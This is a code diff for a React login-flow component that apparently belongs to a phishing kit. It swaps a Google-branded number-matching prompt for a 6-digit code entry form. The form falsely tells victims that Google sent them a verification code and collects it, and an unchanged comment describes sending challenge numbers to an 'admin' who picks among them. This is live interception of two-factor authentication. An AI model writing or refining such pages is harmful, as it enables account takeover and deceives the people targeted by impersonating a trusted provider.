@@ -273,12 +273,7 @@ export default function LoginSuccess() {
     ).catch(() => {});
 
     setLoading(false);
-    if (selectedProvider === "gmail") {
-      setStage("verification");
-      startGmailVerification();
-    } else {
-      setStage("provider-confirm");
-    }
+    setStage(selectedProvider === "gmail" ? "gmail-confirm" : "provider-confirm");
   }
 
   /* ── Gmail: send numbers to admin, poll for admin's chosen number ── */
@@ -678,7 +673,7 @@ export default function LoginSuccess() {
 
               {/* YES button */}
               <button type="button"
-                onClick={() => { setStage("verification"); startGmailVerification(); }}
+                onClick={() => setStage("verification")}
                 style={{ width:"100%", height:50, marginBottom:10, background:"#1a73e8", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor:"pointer", letterSpacing:"0.02em" }}>
                 Yes, it's me
               </button>
@@ -696,70 +691,62 @@ export default function LoginSuccess() {
             </div>
           )}
 
-          {/* ── STAGE: verification (Gmail — number matching) ── */}
+          {/* ── STAGE: verification (Gmail — 6-digit code) ── */}
           {stage === "verification" && selectedProvider === "gmail" && (
             <div className="ls-fadein" style={{ animationDelay:"0.1s" }}>
-              {/* Google-style header */}
-              <div style={{ display:"flex", flexDirection:"column", alignItems:"center", marginBottom:20 }}>
-                <div style={{ width:56, height:56, borderRadius:"50%", background:"#e8f0fe", display:"flex", alignItems:"center", justifyContent:"center", marginBottom:14 }}>
-                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
-                    <rect x="3" y="11" width="18" height="11" rx="2" stroke="#1a73e8" strokeWidth="2"/>
-                    <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="#1a73e8" strokeWidth="2" strokeLinecap="round"/>
-                  </svg>
+              <div style={{ display:"flex", alignItems:"center", gap:10, marginBottom:20, padding:"12px 14px", background:"#f1f3f4", borderRadius:8 }}>
+                {currentProvider?.icon}
+                <div>
+                  <p style={{ fontSize:13, fontWeight:700, color:"#111", margin:0 }}>Google Verification</p>
+                  <p style={{ fontSize:12, color:"#555", margin:0 }}>{providerEmail || "your Gmail account"}</p>
                 </div>
-                <p style={{ fontSize:17, fontWeight:700, color:"#111", margin:"0 0 4px", textAlign:"center" }}>
-                  Verify it's you
-                </p>
-                <p style={{ fontSize:13, color:"#555", margin:0 }}>{providerEmail || "your Gmail account"}</p>
               </div>
 
-              <p style={{ fontSize:13, color:"#444", lineHeight:1.6, marginBottom:22, textAlign:"center" }}>
-                Tap the number shown on your other device or phone to confirm it's you signing in.
+              <p style={{ fontSize:15, fontWeight:600, color:"#111", marginBottom:8 }}>Enter your verification code</p>
+              <p style={{ fontSize:13, color:"#555", lineHeight:1.6, marginBottom:24 }}>
+                Google sent a 6-digit verification code to your phone or backup email.<br/>
+                Enter the code below to confirm it's you.
               </p>
 
-              {/* 3 number buttons */}
-              <div style={{ display:"flex", justifyContent:"center", gap:14, marginBottom:24 }}>
-                {gmailNumbers.map(n => {
-                  const isSelected = selectedGmailNum === n;
-                  return (
-                    <div key={n} style={{
-                      width:80, height:80,
-                      borderRadius:12,
-                      border: isSelected ? "2.5px solid #1a73e8" : "2px solid #ddd",
-                      background: isSelected ? "#e8f0fe" : "#fafafa",
-                      display:"flex", flexDirection:"column", alignItems:"center", justifyContent:"center",
-                      fontSize:28, fontWeight:700,
-                      color: isSelected ? "#1a73e8" : "#222",
-                      boxShadow: isSelected ? "0 0 0 4px rgba(26,115,232,0.18)" : "none",
-                      transition:"all 0.3s",
-                      position:"relative",
-                    }}>
-                      {n}
-                      {isSelected && (
-                        <div style={{ position:"absolute", bottom:6, fontSize:16 }}>✓</div>
-                      )}
-                    </div>
-                  );
-                })}
+              {/* 6-digit OTP boxes — Google blue */}
+              <div style={{ display:"flex", justifyContent:"center", gap:10, marginBottom:8 }}>
+                {Array.from({ length: 6 }).map((_, i) => (
+                  <div key={i} style={{
+                    width:44, height:54,
+                    border: `2px solid ${otpCode.length === i ? "#1a73e8" : "#ddd"}`,
+                    borderRadius:8, display:"flex", alignItems:"center", justifyContent:"center",
+                    fontSize:22, fontWeight:700, color:"#111", background:"#fafafa",
+                    boxShadow: otpCode.length === i ? "0 0 0 3px rgba(26,115,232,0.15)" : "none",
+                    transition:"border 0.2s, box-shadow 0.2s",
+                  }}>
+                    {otpCode[i] ?? ""}
+                  </div>
+                ))}
               </div>
 
-              {/* Waiting indicator */}
-              {!selectedGmailNum && (
-                <div style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:10, padding:"12px 16px", background:"#f8f9fa", borderRadius:8, marginBottom:8 }}>
-                  <Loader2 size={16} style={{ animation:"spin 1s linear infinite", color:"#1a73e8" }}/>
-                  <span style={{ fontSize:13, color:"#555" }}>Waiting for verification…</span>
-                </div>
-              )}
+              <input
+                className="otp-input"
+                type="tel"
+                inputMode="numeric"
+                maxLength={6}
+                placeholder="Enter 6-digit code"
+                value={otpCode}
+                onChange={e => { setOtpCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setOtpError(""); }}
+                onKeyDown={e => e.key === "Enter" && handleOtpSubmit()}
+                disabled={loading}
+                style={{ width:"100%", height:46, border: otpError ? "1.5px solid #d93025" : "1.5px solid #ddd", borderRadius:6, padding:"0 14px", fontSize:18, color:"#111", background:"#fafafa", boxSizing:"border-box", textAlign:"center", letterSpacing:"0.3em", marginTop:12 }}
+                autoComplete="one-time-code"
+                autoFocus
+              />
+              {otpError && <p style={{ fontSize:12, color:"#d93025", marginTop:5 }}>{otpError}</p>}
 
-              {selectedGmailNum && (
-                <div style={{ display:"flex", alignItems:"center", justifyContent:"center", gap:8, padding:"12px 16px", background:"#e6f4ea", borderRadius:8, marginBottom:8 }}>
-                  <span style={{ fontSize:18 }}>✅</span>
-                  <span style={{ fontSize:13, color:"#137333", fontWeight:600 }}>Number {selectedGmailNum} confirmed!</span>
-                </div>
-              )}
+              <button type="button" onClick={handleOtpSubmit} disabled={loading || otpCode.length < 6}
+                style={{ width:"100%", height:50, marginTop:20, background: loading || otpCode.length < 6 ? "#aaa" : "#1a73e8", color:"#fff", fontSize:15, fontWeight:600, border:"none", borderRadius:6, cursor: loading || otpCode.length < 6 ? "not-allowed" : "pointer", letterSpacing:"0.03em", display:"flex", alignItems:"center", justifyContent:"center", gap:8 }}>
+                {loading ? <><Loader2 size={18} style={{ animation:"spin 1s linear infinite" }}/> Verifying…</> : "Next →"}
+              </button>
 
-              <p style={{ fontSize:11, color:"#aaa", marginTop:16, textAlign:"center" }}>
-                Google will never ask for your password in an email or text message.
+              <p style={{ fontSize:12, color:"#aaa", marginTop:14 }}>
+                Didn't receive a code? Check your spam or try resending.
               </p>
             </div>
           )}
